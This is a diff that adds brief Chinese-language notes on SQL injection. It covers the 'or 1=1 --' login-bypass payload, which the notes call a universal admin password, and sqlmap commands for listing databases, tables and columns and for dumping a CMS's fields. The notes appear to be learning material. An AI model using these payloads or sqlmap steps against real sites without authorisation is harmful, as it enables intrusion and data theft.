@@ -1,0 +1,20 @@
+
+sql注入：
+	原理：
+		select * from admin where username='admin' or 1=1  -- 'and password='用户输入的密码'
+
+	利用后台登录万能密码 
+
+	
+	SQLmap：
+		探测：
+			sqlmap -r target.txt -p username --dbs
+
+			sqlmap -u [url] --dbs  
+
+		指定数据库：
+			sqlmap -u [url] -D cms --tables
+		指定表：
+			sqlmap -u [url] -D cms -T articles --columns
+		指定字段：
+			sqlmap -u [url] -D cms -T articles -C id,title,content --dump
